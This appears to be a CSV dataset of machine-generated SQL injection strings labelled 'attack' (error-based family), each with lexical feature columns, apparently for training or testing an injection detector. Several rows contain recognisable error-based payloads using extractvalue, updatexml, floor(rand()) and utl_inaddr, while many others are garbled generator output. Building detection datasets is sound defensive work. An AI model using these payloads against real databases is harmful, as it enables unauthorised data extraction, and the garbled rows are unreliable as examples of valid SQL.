label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%sbzGb?nfj
pr  e group else 3931 DASCT  =  SELECT LISvINE 1   )   )    #   )   6270     Ox  jhrozoaleidalestunint  (  ||chount  = 1  )     case 1 r  (  case 0 by else from chr  o  ~  113  ||chr  (  112  (  *2 when   )   )  WHERE information_schemauT  (  ||chbdhrr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,129,264.0,57.0,4.456130798242619,128.0,20.0,91.0,25.0,0.48484848484848486,0.07575757575757576,0.3446969696969697,0.0946969696969697,0.0,0.0,0.0,0.0,1.0,2.0,0.0,11.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1% ' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'      (  )    (  )   and0x7171706a71 >hr  (  ||chr  (  select union x group select byx  and froma  1 extractvalue  (  ,  )  )     SELECT by else D else unionx ch1yr_es FROM  (  (  (  4386  0  ,floor  =  *   )    113    )   then 1 union 1 end  select   (  ||chounadd.gsyskeyssan113  ||chr  (  )  ||chr  0  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,130,588.0,55.0,4.178978758317769,238.0,69.0,214.0,67.0,0.40476190476190477,0.11734693877551021,0.36394557823129253,0.11394557823129252,2.0,0.0,0.0,0.0,3.0,3.0,0.0,36.0,1.0,3.0,7.0,16.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,2.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'sw'  =  'tuktnuawthhr  (,  select 1   )    )    )  (   )    ,floor  )     )     or d 3785 112  (  select 5192 end   then x   from  x  )  and  (  ||  0   )     =  select end  )     and   or AND   x when   extractvalue  *2   ,    (  4232  4386  )   x else  case     6 from8488 3931 elsech 6825 3785 1 when   (  and  )  0x4b774c75 where by 'i'  112  >  0x7171706a71   from   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,131,669.0,45.0,3.98994872680882,228.0,115.0,264.0,62.0,0.34080717488789236,0.17189835575485798,0.39461883408071746,0.09267563527653214,6.0,0.0,0.0,0.0,3.0,3.0,0.0,37.0,0.0,0.0,9.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,3.0,1.0,3.0,5.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,25.0
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '8844ut4493",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,132,204.0,32.0,3.992877264107819,71.0,45.0,68.0,20.0,0.3480392156862745,0.22058823529411764,0.3333333333333333,0.09803921568627451,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'kMunjq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,133,176.0,35.0,3.9578384897551104,44.0,47.0,61.0,24.0,0.25,0.26704545454545453,0.3465909090909091,0.13636363636363635,2.0,0.0,0.0,0.0,0.0,2.0,0.0,11.0,1.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'asaT   or 4232  4232         )  113  from D  1 1  )     :selectdrvnalltun    a 0 byINAT  (  case me x end  then end2 when.U   SELECT group from hchhrx  rr  (     SELECT union1 else whenxo zos",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,134,370.0,50.0,4.036674239760049,142.0,51.0,147.0,30.0,0.3837837837837838,0.13783783783783785,0.3972972972972973,0.08108108108108109,2.0,0.0,0.0,0.0,0.0,1.0,0.0,20.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'||  (  select 'syesuaa' like ' else else by ) concat  113  ||chr  (  (  *2   ||  122  case z mROW ' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'INWCYux.rchhr  113  ||chhr  (  ||dchr  (  =  *    )   ),concat  || L DINsNUINUN. AIT  )  0  select 0   then end   information_schema,floorhdr  6055   then1 1 DIMSST else 3440  (  (  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,135,470.0,55.0,4.415154013305682,186.0,69.0,154.0,61.0,0.39574468085106385,0.14680851063829786,0.3276595744680851,0.12978723404255318,6.0,0.0,0.0,0.0,2.0,3.0,0.0,23.0,0.0,1.0,8.0,21.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"-1or DIERN1INSMINTNN.UM h  (  113  ||chr  (  (  )  #   113  (  case 0    1 5584me 7158     ||c  (  (  0x7171706a71)     )     (  )   || froms where   1 FROMx   eap  0  then(  =     (  ,  )   )    )     >  (    0 fromchxur  6237,  >  113  #2 when   (  (  122  )|| xx end  0x5c)   from WHERE",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,136,289.0,48.0,3.880568078783543,82.0,44.0,125.0,38.0,0.2837370242214533,0.1522491349480969,0.43252595155709345,0.1314878892733564,0.0,0.0,1.0,0.0,0.0,1.0,0.0,21.0,0.0,0.0,2.0,12.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""'||  (  select 'r.geter  cast WHERE E  || DSSELECT 1INCT  (  s   (    )   (  )    case   ||chr  (  )  6e  end  4386  )   and   x d.(  =  =  8382  caseRu'  =  '  =x.ehr  1045chhr  =  a  a 3785  end   SELECT else when2   )        )    ,concatu,tler  6   (  ||Ui. 6055hr  (  0x5c  ||chrr  (  (  case  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,137,528.0,50.0,3.952865434904282,178.0,63.0,218.0,69.0,0.3371212121212121,0.11931818181818182,0.4128787878787879,0.13068181818181818,4.0,2.0,0.0,0.0,0.0,6.0,0.0,35.0,1.0,0.0,7.0,16.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'am   ))    )    )    andhaving union)     )     )  case where end   then end  )   )    c    ,1 1 when   )1392x.c  113  (  --  || and  (  case 0 '+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'  case  E 6055  )  (  )     )     )   then 1 groupmI Oo.edrue  1297hr  (  6237,  =  )  tleaaadmaleradr.eras(  6237,concat  0  )   or union select 5584 else    from ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,138,1072.0,48.0,3.9550376399080993,361.0,157.0,419.0,135.0,0.33675373134328357,0.146455223880597,0.3908582089552239,0.1259328358208955,4.0,2.0,2.0,0.0,0.0,6.0,0.0,77.0,0.0,3.0,13.0,32.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,2.0,2.0,2.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"1{MC AND0INIG RMI ANT  FROM  =  )  )    )     )    duaadadr  x concat select else Rchr  (  (  (  1297,  *  select FROM   (  ||chrhoutthrosygout",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,139,143.0,39.0,4.220137332873398,75.0,6.0,48.0,14.0,0.5244755244755245,0.04195804195804196,0.3356643356643357,0.0979020979020979,0.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,1.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""  = select from 2017 union  )    concat  6237  )  *)   having x chhr  (  case ||  (  4232  1045  ||chr  (  )  )   FROM WHERE union 0 7881 chr  ||  (  (  )--  ||chr  (  (  case 0   thenhr  select   =  a 8488 5192 5192xtho.  (  (  ||  (  select from and )  6825c else 5023  )  ||chr  (  ||chr  (  4232  113  ,0x717a767a71,floor",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,140,543.0,48.0,4.093153864312498,181.0,95.0,201.0,66.0,0.3333333333333333,0.17495395948434622,0.3701657458563536,0.12154696132596685,0.0,2.0,2.0,0.0,1.0,3.0,0.0,36.0,0.0,0.0,7.0,20.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,2.0,1.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"-Ba 3931 end  ,concat  >  (  select AND 6825a 2131  select  (  ||  (  *,r  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,141,76.0,29.0,3.991605372264345,28.0,12.0,25.0,11.0,0.3684210526315789,0.15789473684210525,0.32894736842105265,0.14473684210526316,0.0,0.0,1.0,0.0,1.0,1.0,0.0,3.0,0.0,0.0,2.0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""  0   )    (  )    from   (  as x U when   1392 from  =  un   )    )0x717a767a71,0x717a767a71le group 3931 whenduaityyas (  ||chr  0x7171706a71  case from 6082hr    (  select   (  )  select 3440  )    )  )   x   x 1 m union end  ||chr  (  select and   (  ||chr  =  9173   SELECT 5192 D WHERE Gby 9173 A1x  (  4232  select :yualt_aa'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,142,334.0,53.0,4.3335126759646565,127.0,64.0,114.0,29.0,0.38023952095808383,0.19161676646706588,0.3413173652694611,0.08682634730538923,1.0,1.0,0.0,0.0,0.0,2.0,0.0,16.0,0.0,1.0,1.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'   (  =  ,0x717a767a71,0x717a767a71,floor  =  )       )   x   x 3931 drnac  (  =  0 8877 else 4493  select  5840  )   FROM    a  D and  I hUwhrNry's duar  er  (  rand  )     =  t_r  (  case        ||chr  chr  8382  select else by rr  (  ||r  selectn  )   )    )  =  )   (  case when group 7158  ,5192i,0x717a767a71,0x717a767a71,0x717a767a71,concat  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,143,351.0,46.0,4.112341396851878,120.0,75.0,122.0,34.0,0.3418803418803419,0.21367521367521367,0.3475783475783476,0.09686609686609686,2.0,0.0,0.0,0.0,0.0,5.0,0.0,14.0,0.0,1.0,8.0,9.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""   (    )     )   )   from 5584 4607u  0x7171706a710x7171706a716055  case from concat  ||chr  (  =  ,0x717a767a71,concat  (  )    )   6082  case   )    )   from.by else 0 4493r  =  )   (  ,0x717a767a71,     1 when   (  select from 1 0  0and      0,1   )    7562  ||r  113  ||ctr  (  (  select AND 0 SELECT from   a 6082 4386  '  =  'iadrararodr    .chr  (  0x7171706a71113  SELECT",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,144,591.0,49.0,3.901259700471891,163.0,126.0,238.0,64.0,0.27580372250423013,0.2131979695431472,0.4027072758037225,0.10829103214890017,2.0,2.0,0.0,0.0,1.0,4.0,0.0,37.0,0.0,0.0,9.0,11.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,0.0,0.0,6.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"-6TEz  >  =  )   having from from,4493  select  'i'    ||u  rand  122  ||chr  ((  select  )  chr  ||chr r  (  (  (  ||chr  (  case union and  ||UsT  0  )   thenWHERE m  m AND group N concat  (  rand  ||    (  ,   thenx  ||UNp E FROM  (  * end  el_lt_ntass group 1   chr  (  case)having,0x717a767a71,floor  0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,145,307.0,51.0,4.347583536118555,144.0,20.0,103.0,40.0,0.46905537459283386,0.06514657980456026,0.3355048859934853,0.13029315960912052,2.0,0.0,1.0,0.0,1.0,1.0,0.0,14.0,0.0,2.0,4.0,18.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,1',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,146,2.0,2.0,1.0,0.0,1.0,0.0,1.0,0.0,0.5,0.0,0.5,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ral"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,147,190.0,29.0,3.4668024337631222,46.0,35.0,83.0,26.0,0.24210526315789474,0.18421052631578946,0.4368421052631579,0.1368421052631579,2.0,2.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"" or when   (  (  case ||  113  =  case when   x  =  ||,hr  (  select   )    )    )   )    )     ) and FROM concatx      where R ' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and '(  =  106  rand  )  select end   FROM   (  * 1045  )    )     x from xxxI.rp.s GRE(  ||  case  6055 or c  ||oun   ax.gykr  (  (  *2   )     0x717a767a712   )    )  ,o or when d.Uch",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,148,607.0,51.0,4.014700373128197,211.0,80.0,244.0,72.0,0.34761120263591433,0.13179571663920922,0.40197693574958815,0.1186161449752883,2.0,1.0,0.0,0.0,4.0,4.0,0.0,40.0,0.0,0.0,8.0,17.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.0,3.0,1.0,4.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"1%fcchht_als   )    )   (       SELECTIN.r    =  (  select   SELECT where end   nthen 1 3931 else where where 0lannu2   )    )   (  )   )     5023  )   (,1  from   addnayter.sna,  (  ||s 6913 by when.r  (  =  ey",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,149,211.0,40.0,3.956950737937936,88.0,17.0,82.0,24.0,0.41706161137440756,0.08056872037914692,0.3886255924170616,0.11374407582938388,0.0,0.0,0.0,0.0,0.0,2.0,0.0,13.0,1.0,1.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,2.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1'||  (  select '_7562thjutuT   )    )    nt  (  ,0x717a767a71,     *2   (  )   )       selectfrom group m   R   0x717a767a71and:_r  (  ||cr  (  ,  >  0  )   )     5305 1 and  8190  *  =  ||a k 5023  (  select union 1 by E 0x7171706a71 3931 by 0    thenx FROMu   (  --einaxt_r  (  (  ||chr  (  (  )chr  (  (  case Cselect group  L union ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,150,337.0,51.0,4.154049679068467,112.0,54.0,128.0,43.0,0.3323442136498516,0.16023738872403562,0.3798219584569733,0.12759643916913946,2.0,0.0,2.0,0.0,2.0,1.0,0.0,20.0,0.0,3.0,3.0,14.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""  ,floor  3440  ,0x717a767a71  --a when  a 1 RI.s from (  )  0  ,  *,  )   (  )  rand  =  3326aT  0  (  (  --2   (     ))   )    )    WHERE AND group 1  1N  chr    se end union whenuthenchruhr  (  (  0  = :-chr  4232  )  =,  0   n     )    6055  and from from ||AND else by LINERT  case,1   x   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,151,297.0,50.0,4.0793070773736,104.0,35.0,122.0,36.0,0.3501683501683502,0.11784511784511785,0.4107744107744108,0.12121212121212122,0.0,1.0,5.0,0.0,1.0,3.0,0.0,16.0,0.0,0.0,6.0,11.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"10x717a767a71""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,152,213.0,28.0,3.372655845697329,49.0,42.0,95.0,27.0,0.2300469483568075,0.19718309859154928,0.4460093896713615,0.1267605633802817,0.0,2.0,0.0,0.0,1.0,1.0,0.0,18.0,0.0,0.0,4.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-4493%6237\*o'  =  'sand2   46074232  )   WHERE by FROM LLs or chchr  4386hr  (  or  ,  ||chr  (  (  4232  0x7171706a71,concat  6055  --aytsutal  =  )   (  )   x 3931 5584 x when  selectgetr  (  select   112  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,153,211.0,46.0,4.461562612535714,71.0,50.0,66.0,24.0,0.33649289099526064,0.23696682464454977,0.3127962085308057,0.11374407582938388,2.0,0.0,5.0,0.0,1.0,2.0,0.0,8.0,1.0,0.0,2.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
